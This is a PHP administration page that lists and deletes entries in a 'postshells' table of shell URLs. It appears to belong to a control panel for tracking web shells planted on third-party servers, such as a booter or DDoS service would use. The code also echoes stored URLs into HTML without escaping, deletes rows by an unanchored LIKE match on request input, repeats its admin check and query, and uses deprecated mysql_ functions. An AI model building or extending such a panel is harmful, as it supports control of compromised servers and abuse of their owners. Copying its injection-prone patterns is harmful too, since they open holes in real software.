<?php

require("header.php");

if(!checkAdmin()) {
die("<div class=\"box\">
    <h2>Administration Panel &bull; Access Denied</h2>
<div class=\"box-content\">
<p>You are not an administrator.</p>
</div></div>");
exit();
}

$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
mysql_select_db(DB_NAME, $link);

$query="SELECT * FROM postshells";
$result = mysql_query($query) or die(mysql_error());
$num = mysql_numrows($result);

if(!checkAdmin()) {
header("Location: login.php");
exit();
}

$link = mysql_connect("localhost", DB_USER, DB_PASS);
mysql_select_db(DB_NAME, $link);

$query="SELECT * FROM postshells";
$result=mysql_query($query) or die(mysql_error());

	if(isset($_GET['delid'])){
		$f1 = mysql_real_escape_string($_GET['delid']);

		if(mysql_query("DELETE FROM postshells WHERE url LIKE '$f1'")){
			echo '<meta http-equiv="refresh" content="0; URL=manageshells.php">';
		}else {
		die(mysql_error());
		}
	}

?>


<div class="box">
<h2>Manage Post Shells</h2>
<div class="box-content">
<table border="1" bordercolor="#FFFFF" style="background-color:#f5f5f5" width="90%" cellpadding="1" cellspacing="1">
	<tr>
<td width="10%"><center>ID</center></td><td width="20%"><center>Link</center></td><td><center><font color="#2876b9">Shell URL</font></center></td><td width="20%"><center>Manage</center></td>
</tr><tr>
<?php
$i = 0;
while ($i < $num) {

$id++;
$f1 = mysql_result($result,$i,"URL");

?>

<?php echo "<tr><td width=\"10%\"><center>{$id}</center></td><td width=\"20%\"><a target=_new href=\"{$f1}\"><center><image alt=\"{$f1}\" border=0 src=\"images/visit.png\"></a></center></td><td width=\"80%\"><center>$f1</td><td><a href=\"manageshells.php?delid={$f1}\"><center><image border=0 src=\"images/cancel.png\"></a></td></center><tr/>"; ?>

<?php
$i++;
}

?>
</tr>
















	
</table>
<br>
</DIV>
</DIV>

<br>

<?php 
include 'footer.php';
?>